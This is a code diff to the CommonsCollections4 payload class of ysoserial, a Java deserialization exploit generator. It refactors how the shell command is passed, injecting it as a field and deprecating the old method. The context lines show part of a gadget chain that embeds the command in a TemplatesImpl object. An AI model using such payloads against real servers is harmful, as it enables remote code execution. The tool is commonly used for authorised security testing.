@@ -11,6 +11,8 @@ import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
 import org.apache.commons.collections4.functors.InstantiateTransformer;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -25,8 +27,17 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 @SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {
+	
+	@Bind private String command;
 
+	/**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
 	public Queue<Object> getObject(final String command) throws Exception {
+		return getObject();
+	}
+
+	public Queue<Object> getObject() throws Exception {
 		Object templates = Gadgets.createTemplatesImpl(command);
 
 		ConstantTransformer constant = new ConstantTransformer(String.class);
